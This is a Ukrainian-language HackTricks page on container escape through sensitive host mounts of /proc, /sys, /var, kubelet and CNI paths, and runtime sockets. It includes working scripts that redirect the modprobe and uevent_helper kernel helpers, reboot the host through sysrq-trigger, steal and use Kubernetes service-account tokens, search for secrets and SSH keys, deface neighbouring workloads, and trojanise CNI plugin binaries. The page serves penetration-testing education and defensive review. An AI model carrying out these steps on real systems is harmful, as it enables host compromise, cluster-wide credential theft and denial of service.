# Чутливі монтування хоста

{{#include ../../../banners/hacktricks-training.md}}

## Огляд

Монтування хоста є однією з найважливіших практичних поверхонь для container-escape, оскільки вони часто зводять нанівець ретельно ізольоване представлення процесів, знову відкриваючи прямий доступ до ресурсів хоста. Небезпечні випадки не обмежуються `/`. Bind mounts для `/proc`, `/sys`, `/var`, runtime sockets, стану, яким керує kubelet, або шляхів, пов’язаних із пристроями, можуть розкрити kernel controls, credentials, файлові системи сусідніх контейнерів і management interfaces runtime.

Ця сторінка існує окремо від окремих сторінок із захисту, оскільки модель зловживання охоплює різні компоненти. Writable host mount є небезпечним частково через mount namespaces, частково через user namespaces, частково через покриття AppArmor або SELinux, а частково через те, який саме шлях хоста було відкрито. Розгляд цього питання як окремої теми значно спрощує аналіз attack surface.

## Відкритий доступ до `/proc`

procfs містить як звичайну інформацію про процеси, так і kernel control interfaces із високим рівнем впливу. Тому bind mount на кшталт `-v /proc:/host/proc` або container view, що відкриває неочікувані writable entries у proc, може призвести до information disclosure, denial of service або direct host code execution.

Важливі шляхи procfs включають:

- `/proc/sys/kernel/core_pattern`
- `/proc/sys/kernel/modprobe`
- `/proc/sys/vm/panic_on_oom`
- `/proc/sys/fs/binfmt_misc`
- `/proc/config.gz`
- `/proc/sysrq-trigger`
- `/proc/kmsg`
- `/proc/kallsyms`
- `/proc/[pid]/mem`
- `/proc/kcore`
- `/proc/kmem`
- `/proc/mem`
- `/proc/sched_debug`
- `/proc/[pid]/mountinfo`

### Зловживання

Почніть із перевірки того, які важливі entries procfs доступні для перегляду або запису:
```bash
for p in \
/proc/sys/kernel/core_pattern \
/proc/sys/kernel/modprobe \
/proc/sysrq-trigger \
/proc/kmsg \
/proc/kallsyms \
/proc/kcore \
/proc/sched_debug \
/proc/1/mountinfo \
/proc/config.gz; do
[ -e "$p" ] && ls -l "$p"
done
```
Ці шляхи цікаві з різних причин. `core_pattern`, `modprobe` і `binfmt_misc` можуть стати шляхами до виконання коду на host, якщо доступні для запису. `kallsyms`, `kmsg`, `kcore` і `config.gz` є потужними джерелами розвідданих для kernel exploitation. `sched_debug` і `mountinfo` розкривають контекст процесів, cgroup і файлової системи, що може допомогти відновити структуру host зсередини контейнера.

Практична цінність кожного шляху відрізняється, і розглядати їх так, ніби вони мають однаковий вплив, ускладнює triage:

- `/proc/sys/kernel/core_pattern`
Якщо доступний для запису, це один із найнебезпечніших шляхів через procfs, оскільки kernel виконує pipe handler після crash. Контейнер, який може вказати `core_pattern` на payload, збережений у його overlay або у змонтованому host path, часто може отримати виконання коду на host. Також див. [read-only-paths.md](protections/read-only-paths.md) для окремого прикладу.
- `/proc/sys/kernel/modprobe`
Цей шлях керує userspace helper, який використовує kernel, коли потрібно запустити логіку завантаження модулів. Якщо він доступний для запису з контейнера та інтерпретується в контексті host, то може стати ще одним primitive для виконання коду на host. Він особливо цікавий у поєднанні зі способом trigger цього helper path.
- `/proc/sys/vm/panic_on_oom`
Зазвичай це не є чистим primitive для escape, але він може перетворити memory pressure на denial of service для всього host, переводячи OOM conditions у поведінку kernel panic.
- `/proc/sys/fs/binfmt_misc`
Якщо registration interface доступний для запису, attacker може зареєструвати handler для вибраного magic value і отримати виконання в контексті host під час виконання відповідного файлу.
- `/proc/config.gz`
Корисний для triage kernel exploit. Він допомагає визначити, які підсистеми, mitigations і додаткові функції kernel увімкнені, без доступу до package metadata host.
- `/proc/sysrq-trigger`
Переважно шлях до denial of service, але дуже серйозний. Він може негайно перезавантажити host, спричинити panic або іншим чином порушити його роботу.
- `/proc/kmsg`
Розкриває повідомлення kernel ring buffer. Корисний для fingerprinting host, аналізу crash і, у деяких середовищах, для leak інформації, яка допомагає kernel exploitation.
- `/proc/kallsyms`
Цінний, якщо доступний для читання, оскільки розкриває інформацію про exported kernel symbols і може допомогти обійти припущення щодо address randomization під час розробки kernel exploit.
- `/proc/[pid]/mem`
Це прямий інтерфейс до пам'яті процесу. Якщо цільовий процес доступний із необхідними ptrace-style conditions, він може дозволити читати або змінювати пам'ять іншого процесу. Реальний вплив значною мірою залежить від credentials, `hidepid`, Yama і ptrace restrictions, тому це потужний, але conditional path.
- `/proc/kcore`
Надає view пам'яті системи у стилі core image. Файл величезний і незручний у використанні, але якщо він справді доступний для читання, це свідчить про небезпечно відкриту memory surface host.
- `/proc/kmem` і `/proc/mem`
Історично це raw memory interfaces із високим впливом. У багатьох сучасних системах вони вимкнені або жорстко обмежені, але якщо вони присутні й доступні для використання, їх слід вважати critical findings.
- `/proc/sched_debug`
Leak-ить інформацію про scheduling і tasks, яка може розкривати ідентифікатори процесів host, навіть коли інші views процесів виглядають чистішими, ніж очікувалося.
- `/proc/[pid]/mountinfo`
Надзвичайно корисний для відновлення того, де саме контейнер розташований на host, які шляхи підтримуються overlay і чи відповідає writable mount вмісту host, чи лише шару контейнера.

Якщо `/proc/[pid]/mountinfo` або overlay details доступні для читання, використайте їх, щоб відновити host path файлової системи контейнера:
```bash
cat /proc/self/mountinfo | head -n 50
mount | grep overlay
```
Ці команди корисні, оскільки низка прийомів виконання на host вимагає перетворення шляху всередині container на відповідний шлях з точки зору host.

### Повний приклад: зловживання шляхом `modprobe` helper

Якщо `/proc/sys/kernel/modprobe` доступний для запису з container, а шлях до helper інтерпретується в контексті host, його можна перенаправити на payload під контролем attacker:
```bash
[ -w /proc/sys/kernel/modprobe ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /tmp/modprobe-payload
#!/bin/sh
id > /tmp/modprobe.out
EOF
chmod +x /tmp/modprobe-payload
echo "$host_path/tmp/modprobe-payload" > /proc/sys/kernel/modprobe
cat /proc/sys/kernel/modprobe
```
Точний тригер залежить від цілі та поведінки kernel, але важливо те, що шлях до helper, доступний для запису, може перенаправити майбутній виклик kernel helper на контрольований атакувальником вміст host path.

### Повний приклад: Kernel Recon за допомогою `kallsyms`, `kmsg` та `config.gz`

Якщо метою є оцінка можливості експлуатації, а не негайний escape:
```bash
head -n 20 /proc/kallsyms 2>/dev/null
dmesg 2>/dev/null | head -n 50
zcat /proc/config.gz 2>/dev/null | egrep 'IKCONFIG|BPF|USER_NS|SECCOMP|KPROBES' | head -n 50
```
Ці команди допомагають визначити, чи доступна корисна інформація про символи, чи містять нещодавні повідомлення kernel цікаві дані про стан, а також які функції kernel або mitigation скомпільовано. Вплив зазвичай не полягає в безпосередньому escape, але це може суттєво скоротити час triage вразливості kernel.

### Повний приклад: перезавантаження хоста через SysRq

Якщо `/proc/sysrq-trigger` доступний для запису та веде до представлення хоста:
```bash
echo b > /proc/sysrq-trigger
```
Ефектом є негайне перезавантаження host. Це не тонкий приклад, але він чітко демонструє, що відкритий доступ до procfs може бути набагато серйознішим за розкриття інформації.

## Відкритий доступ до `/sys`

sysfs розкриває великі обсяги стану kernel і пристроїв. Деякі шляхи sysfs переважно корисні для fingerprinting, тоді як інші можуть впливати на виконання helper, поведінку пристроїв, конфігурацію security-модулів або стан firmware.

До sysfs-шляхів із високою цінністю належать:

- `/sys/kernel/uevent_helper`
- `/sys/class/thermal`
- `/sys/kernel/vmcoreinfo`
- `/sys/kernel/security`
- `/sys/firmware/efi/vars`
- `/sys/firmware/efi/efivars`
- `/sys/kernel/debug`

Ці шляхи важливі з різних причин. `/sys/class/thermal` може впливати на поведінку керування температурою, а отже й на стабільність host у середовищах із небезпечно широким доступом. `/sys/kernel/vmcoreinfo` може leak інформацію про crash-dump і структуру kernel, що допомагає виконувати низькорівневий fingerprinting host. `/sys/kernel/security` є інтерфейсом `securityfs`, який використовують Linux Security Modules, тому неочікуваний доступ до нього може розкривати або змінювати стан, пов’язаний із MAC. Шляхи змінних EFI можуть впливати на налаштування завантаження, що зберігаються у firmware, тому вони набагато серйозніші за звичайні конфігураційні файли. `debugfs` у `/sys/kernel/debug` особливо небезпечний, оскільки це навмисно орієнтований на розробників інтерфейс із набагато меншими очікуваннями щодо безпеки, ніж у hardened production-facing API kernel.

Корисні команди для перевірки цих шляхів:
```bash
find /sys/kernel/security -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/kernel/debug -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/firmware/efi -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/class/thermal -maxdepth 3 -type f 2>/dev/null | head -n 50
cat /sys/kernel/vmcoreinfo 2>/dev/null | head -n 20
```
Що робить ці команди цікавими:

- `/sys/kernel/security` може показати, чи доступна поверхня AppArmor, SELinux або іншого LSM у спосіб, який мав залишатися доступним лише на host.
- `/sys/kernel/debug` часто є найбільш тривожною знахідкою в цій групі. Якщо `debugfs` змонтовано та доступно для читання або запису, очікуйте широку поверхню взаємодії з kernel, точний ризик якої залежить від увімкнених debug-вузлів.
- Відкриття EFI-змінних трапляється рідше, але має високий вплив, оскільки стосується налаштувань, що зберігаються у firmware, а не звичайних файлів runtime.
- `/sys/class/thermal` переважно має значення для стабільності host і взаємодії з hardware, а не для акуратного escape у стилі shell.
- `/sys/kernel/vmcoreinfo` переважно є джерелом fingerprinting host і аналізу crash, корисним для розуміння низькорівневого стану kernel.

### Повний приклад: `uevent_helper`

Якщо `/sys/kernel/uevent_helper` доступний для запису, kernel може виконати контрольований атакувальником helper, коли буде ініційовано `uevent`:
```bash
cat <<'EOF' > /evil-helper
#!/bin/sh
id > /output
EOF
chmod +x /evil-helper
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
echo change > /sys/class/mem/null/uevent
cat /output
```
Причина, чому це працює, полягає в тому, що шлях до helper інтерпретується з точки зору host. Після запуску helper виконується в контексті host, а не всередині поточного container.

## Розкриття `/var`

Монтування `/var` host у container часто недооцінюють, оскільки це не виглядає так драматично, як монтування `/`. На практиці цього може бути достатньо для доступу до runtime-сокетів, директорій snapshot container, томів pod, якими керує kubelet, спроєктованих service-account токенів і файлових систем сусідніх застосунків. На сучасних вузлах саме в `/var` часто знаходиться найцікавіший з операційного погляду стан container.

### Kubernetes Example

Pod із `hostPath: /var` часто може читати спроєктовані токени інших pod і вміст overlay snapshot:
```bash
find /host-var/ -type f -iname '*.env*' 2>/dev/null
find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null
```
Ці команди корисні, оскільки вони показують, чи mount відкриває доступ лише до неважливих даних застосунку, чи до високопривілейованих облікових даних кластера. Доступний для читання service-account token може негайно перетворити локальне виконання коду на доступ до Kubernetes API.

Якщо token присутній, перевірте, до чого він може отримати доступ, замість того щоб зупинятися лише на виявленні token:
```bash
TOKEN=$(cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api
```
Вплив тут може бути значно більшим, ніж локальний доступ до вузла. Токен із широкими дозволами RBAC може перетворити змонтований `/var` на компрометацію всього кластера.

### Приклад Docker і containerd

На Docker-хостах відповідні дані часто розташовані в `/var/lib/docker`, тоді як на Kubernetes-вузлах із containerd вони можуть знаходитися в `/var/lib/containerd` або шляхах, специфічних для snapshotter:
```bash
docker info 2>/dev/null | grep -i 'docker root\\|storage driver'
find /host-var/lib -maxdepth 5 -type f -iname '*.env*' 2>/dev/null | head -n 50
find /host-var/lib -maxdepth 8 -type f -iname 'index.html' 2>/dev/null | head -n 50
```
Якщо змонтований `/var` відкриває доступ до вмісту доступного для запису snapshot іншого workload, attacker може змінити файли application, розмістити web-контент або змінити startup-скрипти, не торкаючись конфігурації поточного container.

Конкретні ідеї зловживання після виявлення доступного для запису вмісту snapshot:
```bash
echo '<html><body>pwned</body></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/<id>/fs/usr/share/nginx/html/index2.html 2>/dev/null
grep -Rni 'JWT_SECRET\\|TOKEN\\|PASSWORD' /host-var/lib 2>/dev/null | head -n 50
find /host-var/lib -type f -path '*/.ssh/*' -o -path '*/authorized_keys' 2>/dev/null | head -n 20
```
Ці команди корисні, оскільки показують три основні категорії впливу змонтованого `/var`: підміна застосунків, відновлення секретів і lateral movement до сусідніх workload.

## Стан Kubelet, плагіни та шляхи CNI

Монтування `/var/lib/kubelet`, `/opt/cni/bin` або `/etc/cni/net.d` часто відкривається через привілейовані DaemonSets, CNI-агенти, CSI node plugins, GPU operators і storage helpers. Такі монтування легко відкинути як «внутрішню інфраструктуру вузла», але вони безпосередньо задіяні в шляху виконання для нових pods і часто містять облікові дані kubelet, projected secrets, registration sockets та виконувані plugin binaries на стороні хоста.

До цілей із високою цінністю належать:

- `/var/lib/kubelet/pki`
- `/var/lib/kubelet/pods`
- `/var/lib/kubelet/device-plugins/kubelet.sock`
- `/var/lib/kubelet/pod-resources/kubelet.sock`
- `/var/lib/kubelet/plugins`
- `/var/lib/kubelet/plugins_registry`
- `/opt/cni/bin`
- `/etc/cni/net.d`

Корисні команди для перевірки:
```bash
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | \
egrep 'pki|pods/.*/token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 2>/dev/null
grep -RniE 'type|ipam|delegate' /host/etc/cni/net.d 2>/dev/null | head -n 50
```
Чому ці шляхи важливі:

- `/var/lib/kubelet/pki` може розкривати клієнтські сертифікати kubelet та інші локальні облікові дані вузла, які іноді можна повторно використати проти API server або TLS-ендпоїнтів kubelet, залежно від конфігурації кластера.<sup>[[1]](#references)</sup>
- `/var/lib/kubelet/pods` часто містить projected service-account tokens і змонтовані Secrets для сусідніх pod'ів на тому самому вузлі.
- `/var/lib/kubelet/pod-resources/kubelet.sock` переважно є поверхнею для розвідки, але дуже корисною: він показує, які pod'и та контейнери наразі використовують GPU, hugepages, пристрої SR-IOV та інші дефіцитні локальні ресурси вузла.<sup>[[1]](#references)</sup>
- `/var/lib/kubelet/device-plugins`, `/var/lib/kubelet/plugins` і `/var/lib/kubelet/plugins_registry` показують, які CSI, DRA та device plugins встановлені, а також з якими socket'ами kubelet має взаємодіяти. Якщо ці директорії доступні для запису, а не лише для читання, finding стає значно серйознішим.<sup>[[1]](#references)</sup>
- `/opt/cni/bin` і `/etc/cni/net.d` безпосередньо беруть участь у налаштуванні pod-network. Доступ для запису до них часто є відкладеним примітивом виконання на host, а не просто розкриттям конфігурації.<sup>[[2]](#references)</sup>

### Повний приклад: доступний для запису `/opt/cni/bin`

Якщо директорія host CNI binaries змонтована з доступом для читання й запису, заміни plugin може бути достатньо для отримання виконання на host наступного разу, коли kubelet створить pod sandbox на цьому вузлі:<sup>[[2]](#references)</sup>
```bash
plugin=$(find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 | \
grep -E '/(bridge|loopback|portmap|calico|flannel|cilium-cni)$' | head -n1)
[ -n "$plugin" ] || exit 1
mv "$plugin" "${plugin}.orig"
cat <<'EOF' > "$plugin"
#!/bin/sh
id > /tmp/cni-triggered
exec "$(dirname "$0")/$(basename "$0").orig" "$@"
EOF
chmod +x "$plugin"
echo "wait for the next pod scheduled on this node"
```
Це не настільки безпосередньо, як змонтований `docker.sock`, але часто є реалістичнішим сценарієм у скомпрометованих інфраструктурних pod'ах Kubernetes. Важливий момент полягає в тому, що змінений бінарний файл згодом виконується процесом налаштування мережі хоста, а не поточним контейнером.

## Сокети середовища виконання

Чутливі монтування хоста часто містять сокети середовища виконання, а не повні каталоги. Вони настільки важливі, що заслуговують на окреме повторне згадування тут:
```text
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/run/buildkit/buildkitd.sock
/var/run/kubelet.sock
/run/firecracker-containerd.sock
```
Див. [runtime-api-and-daemon-exposure.md](runtime-api-and-daemon-exposure.md), щоб ознайомитися з повними сценаріями експлуатації після монтування одного з цих сокетів.

Як швидкий шаблон для першої взаємодії:
```bash
docker -H unix:///host/run/docker.sock version 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///host/var/run/crio/crio.sock ps 2>/dev/null
```
Якщо один із них спрацьовує, шлях від "mounted socket" до "start a more privileged sibling container" зазвичай набагато коротший, ніж будь-який шлях kernel breakout.

## Writable Host Path Task Hijack

Writable host mount не обов'язково має відкривати доступ до `/`, щоб бути небезпечним. Якщо змонтований шлях містить скрипти, конфігураційні файли, hooks, plugins або файли, які згодом використовуються host-side scheduled task чи service, container може отримати змогу змінити те, що виконує host.

Generic review flow:
```bash
mount | grep -E ' /host|/mnt|/shared|/opt|/var '
find /host /mnt /shared -maxdepth 4 -type f -writable 2>/dev/null | head -n 50
grep -RniE 'cron|systemd|ExecStart|sh |bash |python|backup|hook|plugin' /host /mnt /shared 2>/dev/null | head -n 50
```
Якщо процес на хості використовує файл, доступний для запису, під час тестування робіть payload простим і таким, за яким легко спостерігати:
```bash
printf '#!/bin/sh\nid >/tmp/host-task-check\n' > /host/path/to/hook.sh
chmod +x /host/path/to/hook.sh
```
Цікавим аспектом є межа довіри: запис відбувається зсередини контейнера, але виконання пізніше відбувається в контексті сервісу на host. Це перетворює вузький hostPath або bind mount на примітив відкладеного виконання коду на host.

## CVE, пов’язані з mount

Mount на host також перетинаються з уразливостями runtime. Серед важливих нещодавніх прикладів:

- `CVE-2024-21626` у `runc`, де витік дескриптора файлу каталогу міг розмістити робочий каталог у файловій системі host.
- `CVE-2024-23651`, `CVE-2024-23652` і `CVE-2024-23653` у BuildKit, де шкідливі Dockerfile, frontend і потоки `RUN --mount` могли повторно надати доступ до файлів host, дозволити їх видалення або отримання підвищених привілеїв під час build.
- `CVE-2024-1753` у Buildah і потоках build Podman, де спеціально сформовані bind mount під час build могли відкрити `/` для читання й запису.
- `CVE-2025-47290` у `containerd` 2.1.0, де TOCTOU під час розпакування image міг дозволити спеціально сформованому image змінити файлову систему host під час pull.

Ці CVE важливі тут, оскільки показують, що робота з mount стосується не лише конфігурації оператора. Сам runtime також може створювати умови для escape, спричинені mount.

## Перевірки

Використовуйте ці команди, щоб швидко знайти найбільш критичні exposures, пов’язані з mount:
```bash
mount
find / -maxdepth 3 \( -path '/host*' -o -path '/mnt*' -o -path '/rootfs*' \) -type d 2>/dev/null | head -n 100
find / -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | egrep 'pki|token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
Що тут є цікавого:

- Host root, `/proc`, `/sys`, `/var` і runtime sockets — це знахідки з найвищим пріоритетом.
- Записи proc/sys, доступні для запису, часто означають, що mount відкриває глобальні для host елементи керування kernel, а не безпечне container-представлення.
- Шляхи змонтованого `/var` потребують перевірки credentials і сусідніх workload, а не лише перевірки файлової системи.
- Директорії стану Kubelet і шляхи CNI/plugin мають такий самий пріоритет, як і runtime sockets, оскільки часто безпосередньо пов’язані зі шляхом створення pod і розповсюдження credentials на node.

## References

- [1] [Local Files And Paths Used By The Kubelet](https://kubernetes.io/docs/reference/node/kubelet-files/)
- [2] [cilium-agent container can access the host via `hostPath` mount](https://github.com/cilium/cilium/security/advisories/GHSA-4hc4-pgfx-3mrx)

{{#include ../../../banners/hacktricks-training.md}}
